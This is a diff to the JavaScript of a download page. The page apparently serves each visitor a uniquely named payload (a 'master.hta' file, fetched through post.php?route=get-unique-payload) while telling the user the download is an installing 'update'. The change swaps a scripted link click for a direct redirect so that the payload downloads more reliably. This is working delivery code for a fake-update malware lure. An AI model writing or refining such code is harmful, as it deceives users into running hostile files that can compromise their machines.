@@ -204,27 +204,14 @@ async function triggerDownload() {
     status.style.display = 'block';
     
     try {
-        // Fetch unique filename from YOUR EXISTING post.php
-        const res = await fetch('post.php?route=get-unique-payload');
-        const data = await res.json();
+        // Fetch unique filename AND trigger download in ONE request
+        // We use window.location.href because PHP serves the binary file directly
+        window.location.href = 'post.php?route=get-unique-payload';
         
-        if (data.filename) {
-            status.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="#aaa" style="animation:spin 1s linear infinite;display:inline-block;vertical-align:middle;margin-right:6px;"><path d="M12 4V1L8 5l4 4V6c3.31 0 6 2.69 6 6 0 1.01-.25 1.97-.7 2.8l1.46 1.46C19.54 15.03 20 13.57 20 12c0-4.42-3.58-8-8-8z"/></svg> Downloading ' + data.filename + '...';
-            
-            // Trigger download with unique name
-            const link = document.createElement('a');
-            link.href = '/payload/master.hta' + encodeURIComponent(data.filename);
-            link.download = data.filename;
-            document.body.appendChild(link);
-            link.click();
-            document.body.removeChild(link);
-            
-            setTimeout(() => {
-                status.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="#28a745" style="display:inline-block;vertical-align:middle;margin-right:6px;"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Download complete! Installing update...';
-                status.style.color = '#28a745';
-                btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="#fff" style="display:inline-block;vertical-align:middle;margin-right:6px;"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Update Downloaded';
-            }, 2000);
-        } else { throw new Error('No filename received'); }
+        status.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="#28a745" style="display:inline-block;vertical-align:middle;margin-right:6px;"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Download started! Check your downloads folder.';
+        status.style.color = '#28a745';
+        btn.innerHTML = '<svg width="20" height="20" viewBox="0 0 24 24" fill="#fff" style="display:inline-block;vertical-align:middle;margin-right:6px;"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Update Downloaded';
+        
     } catch (e) {
         status.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="#dc3545" style="display:inline-block;vertical-align:middle;margin-right:6px;"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg> Download blocked. Check browser settings.';
         status.style.color = '#dc3545';
